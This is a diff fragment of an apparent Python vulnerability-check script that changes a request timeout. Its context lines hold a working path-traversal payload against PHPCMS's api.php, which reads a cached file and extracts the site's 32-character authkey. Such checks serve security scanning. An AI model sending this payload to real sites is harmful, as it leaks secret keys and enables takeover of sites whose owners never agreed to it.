@@ -23,7 +23,7 @@ class phpcms_authkey_disclosure_BaseVerify:
         payload = "/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
         vulnurl = self.url + payload
         try:
-            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
+            req = requests.get(vulnurl, headers=headers, timeout=4, verify=False)
             m = re.search('(\w{32})',req.text)
             if req.status_code == 200 and m:
                 cprint("[+]存在PHPCMS authkey泄露漏洞...(高危)\tpayload: "+vulnurl+"\tauthkey: "+m.group(1), "red")
